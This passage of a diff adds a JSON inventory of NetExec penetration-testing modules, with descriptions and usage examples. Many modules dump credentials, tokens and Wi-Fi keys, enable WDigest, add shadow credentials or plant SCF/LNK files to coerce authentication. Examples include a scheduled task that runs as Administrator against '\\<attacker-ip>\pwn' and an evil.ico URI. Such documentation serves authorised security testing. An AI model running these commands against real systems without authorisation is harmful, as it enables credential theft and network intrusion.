+      "options_documentation": "CMD            Command to execute\nUSER           User to execute command as\nBINARY         OPTIONAL: Upload the binary to be executed by CMD\nTASK           OPTIONAL: Set a name for the scheduled task name\nFILE           OPTIONAL: Set a name for the command output file\nLOCATION       OPTIONAL: Set a location for the command output file (e.g. 'C:\\\\Windows\\\\Temp\\\\')\nSILENTCOMMAND  OPTIONAL: Do not retrieve output\nCA             OPTIONAL: Set the Certificate Authority name to ask the certificate from (i.e: SERVER\\\\CA_NAME)\nTEMPLATE       OPTIONAL: Set the name of the template to request a certificate from\n\nExample:\n-------\nnxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=whoami\nnxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='bin.exe --option' BINARY=bin.exe\nnxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\\\<attacker-ip>\\pwn' TASK='Legit Task' SILENTCOMMAND='True'\nnxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=certreq CA='ADCS\\whiteflag-ADCS-CA' TEMPLATE=User"
+    },
+    {
+      "source": "nxc/modules/scuffy.py",
+      "name": "scuffy",
+      "description": "Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SERVER      IP of the SMB server\nNAME        SCF file name\nCLEANUP     Cleanup (choices: True or False)"
+    },
+    {
+      "source": "nxc/modules/security-questions.py",
+      "name": "security-questions",
+      "description": "Gets security questions and answers for users on computer",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/shadow-creds.py",
+      "name": "shadow-creds",
+      "description": "List, add, inspect, remove, clear, backup, or revert Shadow Credentials on a user or computer",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "TARGET      sAMAccountName of the target user or computer (for example, TARGET=user or TARGET=DESKTOP-123456$)\nACTION      Action to perform: list, add, info, remove, clear, backup, or revert (default: list); clear removes all KeyCredentials\nDEVICE_ID   KeyCredential device ID; required for info and remove\nJSONFILE    JSON backup path; required for revert and optional for backup\n\nExamples:\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=list\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=add\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=info DEVICE_ID=<guid>\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=remove DEVICE_ID=<guid>\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=clear\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=backup JSONFILE=shadow-creds.json\nnetexec ldap <dc> -u <user> -p <password> -M shadow-creds -o TARGET=DESKTOP-123456$ ACTION=revert JSONFILE=shadow-creds.json"
+    },
+    {
+      "source": "nxc/modules/shadowcoerce.py",
+      "name": "shadowcoerce",
+      "description": "[REMOVED] Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "IPSC             Use IsPathShadowCopied (default: False). ex. IPSC=true\nLISTENER         Listener IP address (default: 127.0.0.1)"
+    },
+    {
+      "source": "nxc/modules/shadowrdp.py",
+      "name": "shadowrdp",
+      "description": "Enables or disables shadow RDP",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/slinky.py",
+      "name": "slinky",
+      "description": "Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SERVER        IP of the listening server (running Responder, etc)\nNAME          LNK file name written to the share(s)\nICO_URI       Override full ICO path (e.g. http://192.168.1.2/evil.ico or \\\\\\\\192.168.1.2\\\\testing_path\\\\icon.ico)\nSHARES        Specific shares to write to (comma separated, e.g. SHARES=share1,share2,share3)\nIGNORE        Specific shares to ignore (comma separated, default: C$,ADMIN$,NETLOGON,SYSVOL)\nCLEANUP       Cleanup (choices: True or False)"
+    },
+    {
+      "source": "nxc/modules/smbghost.py",
+      "name": "smbghost",
+      "description": "Module to check for the SMB dialect 3.1.1 and compression capability of the host, which is an indicator for the SMBGhost vulnerability (CVE-2020-0796).",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/snipped.py",
+      "name": "snipped",
+      "description": "Downloads screenshots taken by the (new) Snipping Tool.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "USERS: Download only specified user(s); format: -o USERS=user1,user2,user3"
+    },
+    {
+      "source": "nxc/modules/spider_plus.py",
+      "name": "spider_plus",
+      "description": "List files recursively and save a JSON share-file metadata to the 'OUTPUT_FOLDER'. See module options for finer configuration.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "List files recursively (excluding `EXCLUDE_FILTER` and `EXCLUDE_EXTS` extensions) and save JSON share-file metadata to the `OUTPUT_FOLDER`.\nIf `DOWNLOAD_FLAG`=True, download files smaller then `MAX_FILE_SIZE` to the `OUTPUT_FOLDER`.\n\nDOWNLOAD_FLAG     Download all share folders/files (Default: False)\nSTATS_FLAG        Disable file/download statistics (Default: True)\nEXCLUDE_EXTS      Case-insensitive extension filter to exclude (Default: ico,lnk)\nEXCLUDE_FILTER    Case-insensitive filter to exclude folders/files (Default: print$,ipc$)\nMAX_FILE_SIZE     Max file size to download (Default: 51200)\nOUTPUT_FOLDER     Path of the local folder to save files (Default: NXC_PATH/nxc_spider_plus)"
+    },
+    {
+      "source": "nxc/modules/spooler.py",
+      "name": "spooler",
+      "description": "Detect if print spooler is enabled or not",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "PORT    Port to check (defaults to 135)"
+    },
+    {
+      "source": "nxc/modules/subnets.py",
+      "name": "subnets",
+      "description": "Retrieves the different Sites and Subnets of an Active Directory",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "SHOWSERVERS    Toggle printing of servers (default: true)"
+    },
+    {
+      "source": "nxc/modules/teams_localdb.py",
+      "name": "teams_localdb",
+      "description": "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/test_connection.py",
+      "name": "test_connection",
+      "description": "Pings a host",
+      "supported_protocols": [
+        "smb",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "HOST      Host to ping"
+    },
+    {
+      "source": "nxc/modules/timeroast.py",
+      "name": "timeroast",
+      "description": "Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/tombstone.py",
+      "name": "tombstone",
+      "description": "Query, restore and delete AD objects",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "ACTION      Specify the action to execute: query, restore or delete. Default is query.\nID          The id of which object you want to restore.\nDN          The DN of which object you want to delete.\n\nUsage:\nnxc ldap $DC-IP -u Username -p Password -M tombstone\nnxc ldap $DC-IP -u Username -p Password -M tombstone -o ACTION=query\nnxc ldap $DC-IP -u Username -p Password -M tombstone -o ACTION=restore ID=5ad162c9-97b1-4a90-a17c-5c2aedb7d1e3\nnxc ldap $DC-IP -u Username -p Password -M tombstone -o ACTION=delete DN=\"CN=test,OU=Users,DC=test,DC=local\""
+    },
+    {
+      "source": "nxc/modules/uac.py",
+      "name": "uac",
+      "description": "Checks UAC status",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": ""
+    },
+    {
+      "source": "nxc/modules/user-desc.py",
+      "name": "user-desc",
+      "description": "Get user descriptions stored in Active Directory",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "LDAP_FILTER     Custom LDAP search filter (fully replaces the default search)\nDESC_FILTER     An additional search filter for descriptions (supports wildcard *)\nDESC_INVERT     An additional search filter for descriptions (shows non matching)\nUSER_FILTER     An additional search filter for usernames (supports wildcard *)\nUSER_INVERT     An additional search filter for usernames (shows non matching)\nKEYWORDS        Use a custom set of keywords (comma separated)\nADD_KEYWORDS    Add additional keywords to the default set (comma separated)"
+    },
+    {
+      "source": "nxc/modules/veeam.py",
+      "name": "veeam",
+      "description": "Extracts credentials from local Veeam SQL Database",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/vnc.py",
+      "name": "vnc",
+      "description": "Loot Passwords from VNC server and client configurations",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "NO_REMOTEOPS     Do not use RemoteRegistry. Will not dump RealVNC, ThighVNC and TigerVNC passwords. Default is False"
+    },
+    {
+      "source": "nxc/modules/wam.py",
+      "name": "wam",
+      "description": "Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/wcc.py",
+      "name": "wcc",
+      "description": "Check various security configuration items on Windows machines",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "OUTPUT_FORMAT   Format for report (Default: 'json')\nOUTPUT          Path for report\nQUIET           Do not print results to stdout (Default: False)"
+    },
+    {
+      "source": "nxc/modules/wdigest.py",
+      "name": "wdigest",
+      "description": "Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "ACTION  Create/Delete the registry key (choices: enable, disable, check)"
+    },
+    {
+      "source": "nxc/modules/web_delivery.py",
+      "name": "web_delivery",
+      "description": "Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module",
+      "supported_protocols": [
+        "smb",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "URL  URL for the download cradle\nPAYLOAD  Payload architecture (choices: 64 or 32) Default: 64"
+    },
+    {
+      "source": "nxc/modules/webdav.py",
+      "name": "webdav",
+      "description": "Checks whether the WebClient service is running on the target",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "MSG     Info message when the WebClient service is running. '{}' is replaced by the target."
+    },
+    {
+      "source": "nxc/modules/whoami.py",
+      "name": "whoami",
+      "description": "Get details of provided user",
+      "supported_protocols": [
+        "ldap"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": "USER  Enumerate information about a different SamAccountName"
+    },
+    {
+      "source": "nxc/modules/wifi.py",
+      "name": "wifi",
+      "description": "Get key of all wireless interfaces",
+      "supported_protocols": [
+        "smb",
+        "wmi",
+        "winrm",
+        "mssql"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "No options available"
+    },
+    {
+      "source": "nxc/modules/winscp.py",
+      "name": "winscp",
+      "description": "Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.",
+      "supported_protocols": [
+        "smb"
+      ],
+      "callbacks": [
+        "on_admin_login"
+      ],
+      "options_documentation": "PATH        Specify the Path if you already found a WinSCP.ini file. (Example: PATH=\"C:\\\\Users\\\\USERNAME\\\\Documents\\\\WinSCP_Passwords\\\\WinSCP.ini\")\n\nREQUIRES ADMIN PRIVILEGES:\nAs Default the script looks into the registry and searches for WinSCP.ini files in\n    \\\"C:\\\\Users\\\\{USERNAME}\\\\Documents\\\\WinSCP.ini\\\" and in\n    \\\"C:\\\\Users\\\\{USERNAME}\\\\AppData\\\\Roaming\\\\WinSCP.ini\\\",\n    for every user found on the System."
+    },
+    {
+      "source": "nxc/modules/zerologon.py",
+      "name": "zerologon",
+      "description": "Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472",
+      "supported_protocols": [
+        "smb",
+        "wmi"
+      ],
+      "callbacks": [
+        "on_login"
+      ],
+      "options_documentation": ""
+    }
+  ],
+  "meaning": "Static source inventory. Runtime capabilities.json and module-inventory.json remain authoritative for the installed NetExec."
+}
